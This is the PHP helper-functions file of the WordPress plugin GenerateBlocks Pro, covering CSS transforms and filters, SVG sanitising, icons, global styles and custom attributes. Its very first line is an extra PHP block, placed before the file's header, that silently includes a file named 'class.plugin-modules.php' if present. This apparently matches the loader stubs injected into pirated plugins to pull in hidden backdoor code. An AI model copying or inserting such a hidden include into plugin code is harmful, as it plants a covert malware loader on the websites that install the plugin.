<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * Handle plugin functions.
 *
 * @package GenerateBlocks Pro
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

/**
 * Get our effect selectors.
 *
 * @since 1.0.0
 * @param array  $effect_data The data.
 * @param array  $settings The settings.
 * @param string $selector The current selector.
 * @param int    $key The current key.
 * @return array
 */
function generateblocks_pro_get_effect_selector( $effect_data, $settings, $selector, $key ) {
	$state = '';
	$device = '';
	$backgroundType = '';

	if ( ! empty( $effect_data[ $key ]['state'] ) && 'normal' !== $effect_data[ $key ]['state'] ) {
		$state = $effect_data[ $key ]['state'];
	}

	if ( ! empty( $effect_data[ $key ]['device'] ) && 'all' !== $effect_data[ $key ]['device'] ) {
		$device = $effect_data[ $key ]['device'];
	}

	if ( isset( $effect_data[ $key ]['type'] ) ) {
		if ( 'background' === $effect_data[ $key ]['type'] ) {
			$backgroundType = 'background';
		} elseif ( 'gradient' === $effect_data[ $key ]['type'] ) {
			$backgroundType = 'gradient';
		}
	}

	$element = 'element' . $backgroundType . $state . $device;

	if ( ! empty( $effect_data[ $key ]['target'] ) && 'self' !== $effect_data[ $key ]['target'] ) {
		$element = $effect_data[ $key ]['target'] . $backgroundType . $state . $device;

		if ( 'customSelector' === $effect_data[ $key ]['target'] && ! empty( $effect_data[ $key ]['customSelector'] ) ) {
			$element = $effect_data[ $key ]['customSelector'] . $backgroundType . $state . $device;
		}
	}

	if ( 'hover' === $state ) {
		$state = ':hover';
	}

	$effectSelector = $selector . $state;

	if ( isset( $effect_data[ $key ]['target'] ) && 'self' !== $effect_data[ $key ]['target'] ) {
		if ( 'innerContainer' === $effect_data[ $key ]['target'] ) {
			$effectSelector = '.gb-container-' . $settings['uniqueId'] . $state . ' > .gb-inside-container';
		}

		if ( 'backgroundImage' === $effect_data[ $key ]['target'] ) {
			$effectSelector = $selector . $state . ':before';
		}

		if ( 'icon' === $effect_data[ $key ]['target'] ) {
			$effectSelector = $selector . $state . ' .gb-icon';
		}

		if ( 'customSelector' === $effect_data[ $key ]['target'] ) {
			$effectSelector = $selector . $state . ' ' . $effect_data[ $key ]['customSelector'];
		}

		if ( 'pseudo-element' === $effect_data[ $key ]['target'] ) {
			$effectSelector = $selector . $state . ':before';

			if ( isset( $effect_data[ $key ]['direction'] ) ) {
				$effectSelector = $selector . $state . ':after';
			}
		}
	}

	return array(
		'element' => $element,
		'selector' => $effectSelector,
	);
}

/**
 * Get our transform data.
 *
 * @since 1.0.0
 * @param array  $settings  The block settings.
 * @param string $selector The selector we're using.
 */
function generateblocks_pro_get_transforms( $settings, $selector ) {
	$transformData = array();

	if ( $settings['useTransform'] && $settings['transforms'] ) {
		foreach ( $settings['transforms'] as $key => $value ) {
			$selectorData = generateblocks_pro_get_effect_selector( $settings['transforms'], $settings, $selector, $key );
			$element = $selectorData['element'];
			$effectSelector = $selectorData['selector'];

			$transformData[ $element ]['selector'] = $effectSelector;
			$transformData[ $element ]['state'] = ! empty( $value['state'] ) ? $value['state'] : 'normal';
			$transformData[ $element ]['device'] = ! empty( $value['device'] ) ? $value['device'] : 'all';

			if ( 'translate' === $value['type'] ) {
				$translateX = 0;
				$translateY = 0;

				if ( isset( $value['translateX'] ) && '' !== $value['translateX'] ) {
					$translateX = (float) $value['translateX'] . 'px';
				}

				if ( isset( $value['translateY'] ) && '' !== $value['translateY'] ) {
					$translateY = (float) $value['translateY'] . 'px';
				}

				if ( $translateX || $translateY ) {
					$transformData[ $element ]['transforms'][] = 'translate3d(' . $translateX . ',' . $translateY . ',0)';
				}
			}

			if ( 'rotate' === $value['type'] ) {
				if ( isset( $value['rotate'] ) && '' !== $value['rotate'] ) {
					$transformData[ $element ]['transforms'][] = 'rotate(' . (float) $value['rotate'] . 'deg)';
				}
			}

			if ( 'skew' === $value['type'] ) {
				if ( isset( $value['skewX'] ) && '' !== $value['skewX'] ) {
					$transformData[ $element ]['transforms'][] = 'skewX(' . (float) $value['skewX'] . 'deg)';
				}

				if ( isset( $value['skewY'] ) && '' !== $value['skewY'] ) {
					$transformData[ $element ]['transforms'][] = 'skewY(' . (float) $value['skewY'] . 'deg)';
				}
			}

			if ( 'scale' === $value['type'] ) {
				if ( isset( $value['scale'] ) && '' !== $value['scale'] ) {
					$transformData[ $element ]['transforms'][] = 'scale(' . (float) $value['scale'] . ')';
					$transformData[ $element ]['transforms'][] = 'perspective(1000px)'; // Activate GPU.
				}
			}
		}
	}

	return $transformData;
}

/**
 * Get our CSS filter data.
 *
 * @since 1.0.0
 * @param array  $settings  The block settings.
 * @param string $selector The selector we're using.
 */
function generateblocks_pro_get_css_filters( $settings, $selector ) {
	$filterData = array();

	if ( $settings['useFilter'] && $settings['filters'] ) {
		foreach ( $settings['filters'] as $key => $value ) {
			$selectorData = generateblocks_pro_get_effect_selector( $settings['filters'], $settings, $selector, $key );
			$element = $selectorData['element'];
			$effectSelector = $selectorData['selector'];

			$filterData[ $element ]['selector'] = $effectSelector;
			$filterData[ $element ]['state'] = ! empty( $value['state'] ) ? $value['state'] : 'normal';
			$filterData[ $element ]['device'] = ! empty( $value['device'] ) ? $value['device'] : 'all';

			if ( 'blur' === $value['type'] ) {
				if ( isset( $value['blur'] ) && '' !== $value['blur'] ) {
					$filterData[ $element ]['filters'][] = 'blur(' . (float) $value['blur'] . 'px)';
				}
			}

			if ( 'brightness' === $value['type'] ) {
				if ( isset( $value['brightness'] ) && '' !== $value['brightness'] ) {
					$filterData[ $element ]['filters'][] = 'brightness(' . (float) $value['brightness'] . '%)';
				}
			}

			if ( 'contrast' === $value['type'] ) {
				if ( isset( $value['contrast'] ) && '' !== $value['contrast'] ) {
					$filterData[ $element ]['filters'][] = 'contrast(' . (float) $value['contrast'] . '%)';
				}
			}

			if ( 'grayscale' === $value['type'] ) {
				if ( isset( $value['grayscale'] ) && '' !== $value['grayscale'] ) {
					$filterData[ $element ]['filters'][] = 'grayscale(' . (float) $value['grayscale'] . '%)';
				}
			}

			if ( 'hue-rotate' === $value['type'] ) {
				if ( isset( $value['hueRotate'] ) && '' !== $value['hueRotate'] ) {
					$filterData[ $element ]['filters'][] = 'hue-rotate(' . (float) $value['hueRotate'] . 'deg)';
				}
			}

			if ( 'invert' === $value['type'] ) {
				if ( isset( $value['invert'] ) && '' !== $value['invert'] ) {
					$filterData[ $element ]['filters'][] = 'invert(' . (float) $value['invert'] . '%)';
				}
			}

			if ( 'saturate' === $value['type'] ) {
				if ( isset( $value['saturate'] ) && '' !== $value['saturate'] ) {
					$filterData[ $element ]['filters'][] = 'saturate(' . (float) $value['saturate'] . '%)';
				}
			}

			if ( 'sepia' === $value['type'] ) {
				if ( isset( $value['sepia'] ) && '' !== $value['sepia'] ) {
					$filterData[ $element ]['filters'][] = 'sepia(' . (float) $value['sepia'] . '%)';
				}
			}
		}
	}

	return $filterData;
}

/**
 * Check if we can upload SVG files.
 *
 * @since 1.1.0
 */
function generateblocks_pro_has_svg_support() {
	return in_array( 'image/svg+xml', (array) get_allowed_mime_types() );
}

/**
 * Try to sanitize SVGs if the Safe SVG plugin isn't active.
 *
 * @since 1.0.0
 */
function generateblocks_pro_kses_svg() {
	$kses_defaults = wp_kses_allowed_html( 'post' );

	$svg_args = array(
		'svg' => array(
			'class'           => true,
			'aria-hidden'     => true,
			'aria-labelledby' => true,
			'role'            => true,
			'xmlns'           => true,
			'width'           => true,
			'height'          => true,
			'viewbox'         => true, // <= Must be lower case!
		),
		'g' => array( 'fill' => true ),
		'title' => array( 'title' => true ),
		'path' => array(
			'd' => true,
			'fill' => true,
		),
	);

	return array_merge( $kses_defaults, $svg_args );
}

/**
 * Prepare our custom icons for the editor.
 *
 * @since 1.0.0
 */
function generateblocks_pro_editor_icon_list() {
	$custom_icons = get_option( 'generateblocks_svg_icons', array() );
	$new_icons = array();

	// Format our custom shapes to fit our shapes structure.
	foreach ( $custom_icons as $index => $data ) {
		$new_icons[ sanitize_key( $data['group'] ) ] = array(
			'group' => sanitize_text_field( $data['group'] ),
			'svgs' => array(),
		);

		if ( isset( $data['icons'] ) ) {
			foreach ( (array) $data['icons'] as $shape_index => $icon ) {
				$new_icons[ sanitize_key( $data['group'] ) ]['svgs'][ $icon['id'] ] = array(
					'label' => $icon['name'],
					'icon' => $icon['icon'],
				);
			}
		}
	}

	return $new_icons;
}

/**
 * Get all of our global style IDs.
 *
 * @since 1.0.0
 */
function generateblocks_pro_get_global_style_ids() {
	$global_styles = get_option( 'generateblocks_global_style_attrs', array() );
	$ids = array();

	foreach ( $global_styles as $id => $data ) {
		foreach ( $data['ids'] as $name => $block_ids ) {
			foreach ( $block_ids as $id ) {
				$ids[ $name ][] = $id['uniqueId'];
			}
		}
	}

	return $ids;
}

/**
 * Get all of our global style IDs.
 *
 * @since 1.0.0
 */
function generateblocks_pro_get_global_style_attrs() {
	$global_styles = get_option( 'generateblocks_global_style_attrs', array() );
	$ids = array();

	foreach ( $global_styles as $id => $data ) {
		foreach ( $data['ids'] as $name => $block_ids ) {
			foreach ( $block_ids as $id => $attrs ) {
				$ids[ $name ][ $id ] = $attrs;
			}
		}
	}

	return $ids;
}

/**
 * Add custom attributes to a block.
 *
 * @since 1.3.0
 * @param array $attributes The existing attributes.
 * @param array $settings The settings for the block.
 */
function generateblocks_pro_with_custom_attributes( $attributes, $settings ) {
	if ( ! empty( $settings['htmlAttributes'] ) && is_array( $settings['htmlAttributes'] ) ) {
		foreach ( $settings['htmlAttributes'] as $key => $data ) {
			if ( ! $data['attribute'] ) {
				continue;
			}

			$attribute = esc_attr( $data['attribute'] );
			$attributes[ $attribute ] = isset( $data['value'] ) && '' !== $data['value'] ? esc_attr( $data['value'] ) : true;
		}
	}

	return $attributes;
}
